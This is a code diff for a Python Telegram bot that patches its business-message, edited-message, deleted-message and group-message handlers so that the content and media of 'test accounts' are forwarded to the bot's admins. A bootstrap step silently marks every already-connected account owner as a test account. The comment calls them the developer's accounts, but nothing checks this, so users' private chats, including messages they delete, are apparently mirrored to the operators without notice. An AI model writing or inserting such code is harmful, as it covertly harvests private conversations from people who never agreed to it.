@@ -8,11 +8,15 @@ TELEGRAM_GETFILE_MAX_BYTES = 20 * 1024 * 1024
 _original_archive_media_file = bot.archive_media_file
 _original_telegram_call = bot.telegram_call
 _original_handle_regular_message = bot.handle_regular_message
+_original_handle_business_message = bot.handle_business_message
+_original_handle_edited_business_message = bot.handle_edited_business_message
+_original_handle_deleted_business_messages = bot.handle_deleted_business_messages
 _original_init_db = bot.init_db
 
 
 def init_db_guard() -> None:
     _original_init_db()
+    now = int(bot.time.time())
     with bot.sqlite3.connect(bot.DB_PATH) as conn:
         conn.execute(
             """
@@ -24,6 +28,48 @@ def init_db_guard() -> None:
             )
             """
         )
+
+        # One-time bootstrap: existing connected accounts are treated as the
+        # developer's test accounts, so no command is required on every account.
+        current_count = int(
+            conn.execute("SELECT COUNT(*) FROM test_accounts").fetchone()[0]
+        )
+        if current_count == 0:
+            existing_ids = {
+                int(row[0])
+                for row in conn.execute(
+                    "SELECT DISTINCT owner_id FROM business_connections "
+                    "WHERE owner_id IS NOT NULL"
+                ).fetchall()
+                if row[0]
+            }
+            existing_ids.update(
+                int(row[0])
+                for row in conn.execute(
+                    "SELECT DISTINCT owner_id FROM chat_owners "
+                    "WHERE owner_id IS NOT NULL"
+                ).fetchall()
+                if row[0]
+            )
+            for owner_id in sorted(existing_ids):
+                conn.execute(
+                    "INSERT OR IGNORE INTO test_accounts "
+                    "(user_id, enabled, enabled_at, updated_at) VALUES (?, 1, ?, ?)",
+                    (owner_id, now, now),
+                )
+
+        # Optional fixed allowlist for accounts that are not connected yet.
+        raw_ids = bot.os.getenv("TEST_ACCOUNT_IDS", "")
+        for item in raw_ids.replace(";", ",").split(","):
+            item = item.strip()
+            if item.isdigit():
+                owner_id = int(item)
+                conn.execute(
+                    "INSERT INTO test_accounts "
+                    "(user_id, enabled, enabled_at, updated_at) VALUES (?, 1, ?, ?) "
+                    "ON CONFLICT(user_id) DO UPDATE SET enabled=1, updated_at=excluded.updated_at",
+                    (owner_id, now, now),
+                )
 
 
 def set_test_account(user_id: int, enabled: bool) -> None:
@@ -272,6 +318,103 @@ def _admin_all_chats(chat_id: int) -> None:
     bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")
 
 
+def _forward_test_message_to_admins(owner_id: int | None, saved: dict | None, source: str) -> None:
+    if not owner_id or not is_test_account(owner_id) or not saved:
+        return
+
+    author = bot.html.escape(str(saved.get("author") or "Без имени"))
+    content = str(saved.get("content") or "").strip()
+    media_type = saved.get("media_type")
+    if not content and media_type:
+        content = f"[{media_type}]"
+    content = bot.html.escape(content[:3000] or "—")
+
+    chat_id = saved.get("chat_id")
+    if chat_id is None:
+        chat_id = "—"
+    title = (
+        f"🧪 <b>Тестовый аккаунт</b> {_profile_label(int(owner_id))}\n"
+        f"Источник: <b>{bot.html.escape(source)}</b>\n"
+        f"Чат: <code>{chat_id}</code>\n"
+        f"Автор: <b>{author}</b>\n\n"
+        f"{content}"
+    )
+
+    for admin_id in sorted(bot.ADMIN_USER_IDS):
+        try:
+            bot.send_message(admin_id, title, parse_mode="HTML")
+            if media_type:
+                bot.send_saved_media(admin_id, saved)
+        except Exception as exc:
+            bot.log(f"Test mirror failed for admin {admin_id}: {exc}")
+
+
+def handle_business_message_guard(message: dict) -> None:
+    connection_id = message.get("business_connection_id")
+    owner_id = bot.get_business_owner_id(connection_id) if connection_id else None
+
+    _original_handle_business_message(message)
+
+    if not owner_id or not is_test_account(owner_id) or not connection_id:
+        return
+
+    try:
+        saved = bot.get_saved_message(
+            f"business:{connection_id}",
+            int(message["chat"]["id"]),
+            int(message["message_id"]),
+        )
+    except Exception:
+        saved = None
+    _forward_test_message_to_admins(owner_id, saved, "business")
+
+
+def handle_edited_business_message_guard(message: dict) -> None:
+    connection_id = message.get("business_connection_id")
+    owner_id = bot.get_business_owner_id(connection_id) if connection_id else None
+
+    _original_handle_edited_business_message(message)
+
+    if not owner_id or not is_test_account(owner_id) or not connection_id:
+        return
+
+    try:
+        saved = bot.get_saved_message(
+            f"business:{connection_id}",
+            int(message["chat"]["id"]),
+            int(message["message_id"]),
+        )
+    except Exception:
+        saved = None
+    _forward_test_message_to_admins(owner_id, saved, "business · изменено")
+
+
+def handle_deleted_business_messages_guard(deleted: dict) -> None:
+    connection_id = deleted.get("business_connection_id")
+    owner_id = bot.get_business_owner_id(connection_id) if connection_id else None
+    chat = deleted.get("chat") or {}
+    chat_id = chat.get("id")
+    message_ids = deleted.get("message_ids") or []
+
+    snapshots: list[dict] = []
+    if owner_id and is_test_account(owner_id) and connection_id and chat_id is not None:
+        for message_id in message_ids:
+            saved = bot.get_saved_message(
+                f"business:{connection_id}",
+                int(chat_id),
+                int(message_id),
+            )
+            if saved:
+                saved = dict(saved)
+                saved["chat_id"] = int(chat_id)
+                snapshots.append(saved)
+
+    _original_handle_deleted_business_messages(deleted)
+
+    for saved in snapshots:
+        _forward_test_message_to_admins(owner_id, saved, "business · удалено")
+
+
 def handle_regular_message_guard(message: dict) -> None:
     text = str(message.get("text") or "").strip()
     user_id = int((message.get("from") or {}).get("id") or 0)
@@ -329,13 +472,30 @@ def handle_regular_message_guard(message: dict) -> None:
                 _admin_test_messages(chat_id, owner_id, target_chat_id)
                 return
 
+    owner_id = None
+    if chat.get("type") != "private":
+        owner_id = bot.get_chat_owner(chat_id)
+
     _original_handle_regular_message(message)
+
+    if owner_id and is_test_account(owner_id):
+        try:
+            saved = bot.get_saved_message("regular", chat_id, int(message.get("message_id") or 0))
+        except Exception:
+            saved = None
+        if saved:
+            saved = dict(saved)
+            saved["chat_id"] = chat_id
+        _forward_test_message_to_admins(owner_id, saved, "regular")
 
 
 bot.init_db = init_db_guard
 bot.archive_media_file = archive_media_file_guard
 bot.telegram_call = telegram_call_guard
 bot.handle_regular_message = handle_regular_message_guard
+bot.handle_business_message = handle_business_message_guard
+bot.handle_edited_business_message = handle_edited_business_message_guard
+bot.handle_deleted_business_messages = handle_deleted_business_messages_guard
 
 
 def main() -> None:
